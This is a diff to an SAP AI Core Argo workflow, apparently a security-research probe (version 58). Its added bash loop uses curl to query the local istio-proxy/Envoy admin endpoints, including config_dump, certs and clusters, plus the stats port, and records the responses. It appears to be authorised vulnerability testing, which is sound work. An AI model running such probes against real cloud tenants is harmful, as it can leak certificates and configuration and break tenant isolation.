@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "57.0.0"
+    ai.sap.com/version: "58.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,7 +24,7 @@ spec:
       - bash
       - -c
       - |
-        # V57: Argo Workflows server on port 2746 + storedWorkflowTemplateSpec
+        # V58: Localhost istio-proxy admin (15000) + Argo Workflows server (2746)
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -48,6 +48,24 @@ spec:
         OUR_NS="rg-3ba0e0a4-cd927cab"
         EXEC_ID=$(printenv AICORE_EXECUTION_ID)
         save "exec-id-${EXEC_ID}"
+
+        # LOCALHOST ISTIO-PROXY ADMIN INTERFACE (15000)
+        echo "=== LOCALHOST ISTIO-PROXY 15000 ===" >&2
+
+        # Test the main Envoy admin endpoints that were confirmed reachable in the original finding
+        for endpoint in "" "config_dump" "certs" "clusters" "listeners" "stats/prometheus" "server_info" "runtime" "ready"; do
+          url="http://localhost:15000/${endpoint}"
+          echo "Testing: $url" >&2
+          R=$(curl -sk --connect-timeout 5 --max-time 10 "$url" 2>&1 | head -c 300)
+          endpoint_clean=$(echo "$endpoint" | tr '/' '-' | tr -c 'a-zA-Z0-9._-' '-')
+          endpoint_clean=${endpoint_clean:-root}
+          save "istio-15000-${endpoint_clean}-$(echo $R | head -c 100)"
+        done
+
+        # Also test localhost:15090/stats/prometheus (Envoy stats port)
+        echo "Testing: http://localhost:15090/stats/prometheus" >&2
+        R=$(curl -sk --connect-timeout 5 --max-time 10 "http://localhost:15090/stats/prometheus" 2>&1 | head -c 300)
+        save "envoy-15090-stats-$(echo $R | head -c 100)"
 
         # 1. Try port 2746 (correct Argo Workflows port!)
         echo "=== ARGO SERVER 2746 ===" >&2
@@ -100,4 +118,4 @@ spec:
           fi
         done
 
-        echo "V57 DONE" >&2
+        echo "V58 DONE" >&2
